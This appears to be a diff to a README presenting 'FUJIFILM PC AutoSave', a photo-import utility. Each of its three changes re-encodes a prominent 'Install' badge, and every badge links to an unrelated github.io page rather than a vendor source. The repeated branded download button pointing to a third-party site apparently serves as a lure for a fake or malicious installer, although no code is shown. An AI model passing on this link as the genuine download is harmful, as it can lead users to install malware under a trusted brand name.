@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM%20PC%20AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM+PC+AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FUJIFILM PC AutoSave is a free utility that automatically imports and saves imag
 
 <div align="center">
 
-[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM%20PC%20AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM+PC+AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FUJIFILM PC AutoSave is a free utility that automatically imports and saves imag
 
 <div align="center">
 
-[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM%20PC%20AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM PC AutoSave](https://img.shields.io/badge/⬇_Install_FUJIFILM+PC+AutoSave-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
